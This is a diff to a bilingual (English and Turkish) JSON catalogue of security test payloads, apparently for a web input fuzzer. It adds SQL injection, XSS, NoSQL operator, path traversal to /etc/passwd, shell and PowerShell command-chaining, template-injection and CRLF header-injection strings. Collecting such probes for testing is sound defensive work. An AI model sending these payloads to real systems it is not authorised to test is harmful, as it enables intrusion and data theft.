@@ -12,7 +12,10 @@
       "Union Select Column Probe 4": "' UNION SELECT NULL,NULL,NULL,NULL--",
       "Union Select Column Probe 5": "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
       "Database Brand Fingerprint": "' OR VERSION() > 1--",
-      "Stacked Query Separator": "'; SELECT 1;--"
+      "Stacked Query Separator": "'; SELECT 1;--",
+      "Error-Based Double Quote": "\" AND GTID_SUBSET(CONCAT('~',@@VERSION,'~'),1)--",
+      "Boolean-Based Blind Probe": "' AND 1=1--",
+      "SQL Tautology Bypass": "' OR 'xyz'='xyz"
     },
     "XSS & HTML Sanitization": {
       "Basic Script Tag": "<script>alert(1)</script>",
@@ -25,7 +28,17 @@
       "Input Tag Focus Trigger": "<input autofocus onfocus=alert(1)>",
       "Link Anchor Tag Javascript Protocol": "<a href=\"javascript:alert(1)\">Click me</a>",
       "XSLT Stylesheet Processing": "<?xml-stylesheet type=\"text/xsl\" href=\"#\"?>",
-      "JavaScript Literal Escapes": "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e"
+      "JavaScript Literal Escapes": "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
+      "Math Event Polyglot": "<math><show onerror=alert(1)>",
+      "Details Toggle Event": "<details open ontoggle=alert(1)>",
+      "Bypass via HTML Entities": "&lt;script&gt;alert(1)&lt;/script&gt;"
+    },
+    "NoSQL & JSON Injection": {
+      "MongoDB Greater Than Operator": "{\"$gt\": \"\"}",
+      "MongoDB Not Equal Operator": "{\"$ne\": null}",
+      "MongoDB Where True Clause": "|| 1==1",
+      "JSON Syntax Breakout": "\"} , {\"override\": true",
+      "Array Parameter Hijack": "[\"admin\", \"user\"]"
     },
     "Directory Traversal & Paths": {
       "Unix Basic Traversal": "../",
@@ -36,7 +49,8 @@
       "Unicode Traversal Slash": "..%c0%af",
       "Overlong UTF-8 Slash Bypass": "..%c1%9c",
       "Null Byte Terminated Path": "../../../../../etc/passwd\u0000.jpg",
-      "UNC Path Windows Share": "\\\\127.0.0.1\\c$\\windows\\win.ini"
+      "UNC Path Windows Share": "\\\\127.0.0.1\\c$\\windows\\win.ini",
+      "Direct File Scheme Link": "file:///etc/passwd"
     },
     "OS Command Boundaries": {
       "Semicolon Command Linker": "; id ;",
@@ -46,7 +60,20 @@
       "Subshell Interpolation Command": "$(id)",
       "Backtick Shell Evaluation": "`id`",
       "New Line Command Chain": "\nid\n",
-      "Carriage Return Linker": "\rid\r"
+      "Carriage Return Linker": "\rid\r",
+      "PowerShell Command Linker": "; Invoke-Expression (id)"
+    },
+    "SSTI & SSI Template Boundaries": {
+      "Jinja/Twig Expression Evaluation": "{{7*7}}",
+      "Jinja/Twig Object Access": "{{self}}",
+      "ES6 Template Literal Boundary": "${7*7}",
+      "AngularJS Basic Expression": "{{constructor.constructor('alert(1)')()}}",
+      "SSI Exec Directive Injection": "<!--#exec cmd=\"id\" -->"
+    },
+    "CRLF HTTP Header Injection": {
+      "Basic CRLF Header Split": "%0d%0aSet-Cookie: test=1",
+      "CRLF X-Forwarded-For Forge": "%0d%0aX-Forwarded-For: 127.0.0.1",
+      "Bypass via Carriage Return LF": "\r\nLocation: http://google.com"
     },
     "Format Violations & Overflows": {
       "Buffer Length (256 A's)": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
@@ -85,7 +112,10 @@
       "Union Kolon Tespiti 4": "' UNION SELECT NULL,NULL,NULL,NULL--",
       "Union Kolon Tespiti 5": "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
       "Veritabanı Sürüm Tespiti": "' OR VERSION() > 1--",
-      "Çoklu Sorgu Ayırıcı": "'; SELECT 1;--"
+      "Çoklu Sorgu Ayırıcı": "'; SELECT 1;--",
+      "Hata Tabanlı Çift Tırnak": "\" AND GTID_SUBSET(CONCAT('~',@@VERSION,'~'),1)--",
+      "Mantıksal Kör Tarama": "' AND 1=1--",
+      "SQL Totoloji Aşımı": "' OR 'xyz'='xyz"
     },
     "XSS & HTML Temizleme": {
       "Temel Script Etiketi": "<script>alert(1)</script>",
@@ -98,7 +128,17 @@
       "Odaklanma Tetikleyici Girdi": "<input autofocus onfocus=alert(1)>",
       "Anchor Javascript Protokolü": "<a href=\"javascript:alert(1)\">Click me</a>",
       "XSLT Stil Şablonu İşleme": "<?xml-stylesheet type=\"text/xsl\" href=\"#\"?>",
-      "JavaScript Harf Kaçışları": "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e"
+      "JavaScript Harf Kaçışları": "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
+      "Math Olay Vektörü": "<math><show onerror=alert(1)>",
+      "Details Toggle Tetikleyici": "<details open ontoggle=alert(1)>",
+      "HTML Kod Varlıklarıyla Aşım": "&lt;script&gt;alert(1)&lt;/script&gt;"
+    },
+    "NoSQL & JSON Enjeksiyonu": {
+      "MongoDB Büyüktür Operatörü": "{\"$gt\": \"\"}",
+      "MongoDB Eşit Değildir Operatörü": "{\"$ne\": null}",
+      "MongoDB Where True Kuralı": "|| 1==1",
+      "JSON Sözdizimi Kırma": "\"} , {\"override\": true",
+      "Dizi Parametresi Ele Geçirme": "[\"admin\", \"user\"]"
     },
     "Dizin Gezinti & Dosya Yolları": {
       "Unix Basit Dizin Gezinti": "../",
@@ -109,7 +149,8 @@
       "Unicode Kodlu Gezinti Eğik Çizgisi": "..%c0%af",
       "Uzun UTF-8 Eğik Çizgi Aşımı": "..%c1%9c",
       "Null Byte Sonlandırmalı Yol": "../../../../../etc/passwd\u0000.jpg",
-      "UNC Ağ Paylaşım Yolu": "\\\\127.0.0.1\\c$\\windows\\win.ini"
+      "UNC Ağ Paylaşım Yolu": "\\\\127.0.0.1\\c$\\windows\\win.ini",
+      "Doğrudan Dosya Şeması Linki": "file:///etc/passwd"
     },
     "Sistem Komut Sınırları": {
       "Noktalı Virgül Komut Zinciri": "; id ;",
@@ -119,7 +160,20 @@
       "Alt Kabuk Çalıştırma Komutu": "$(id)",
       "Ters Tırnak Kabuk Çalıştırma": "`id`",
       "Yeni Satır Komut Zinciri": "\nid\n",
-      "Satır Başı Karakter Bağlayıcı": "\rid\r"
+      "Satır Başı Karakter Bağlayıcı": "\rid\r",
+      "PowerShell Komut Bağlayıcısı": "; Invoke-Expression (id)"
+    },
+    "SSTI & SSI Şablon Sınırları": {
+      "Jinja/Twig İfade Değerlendirme": "{{7*7}}",
+      "Jinja/Twig Nesne Erişimi": "{{self}}",
+      "ES6 Şablon Değişken Sınırı": "${7*7}",
+      "AngularJS Temel İfadesi": "{{constructor.constructor('alert(1)')()}}",
+      "SSI Exec Direktif Enjeksiyonu": "<!--#exec cmd=\"id\" -->"
+    },
+    "CRLF HTTP Başlık Enjeksiyonu": {
+      "Temel CRLF Başlık Bölme": "%0d%0aSet-Cookie: test=1",
+      "CRLF X-Forwarded-For Taklidi": "%0d%0aX-Forwarded-For: 127.0.0.1",
+      "Satır Başı Karakteriyle Atlama": "\r\nLocation: http://google.com"
     },
     "Format İhlalleri & Aşım Testleri": {
       "Arabellek Uzunluğu (256 A)": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
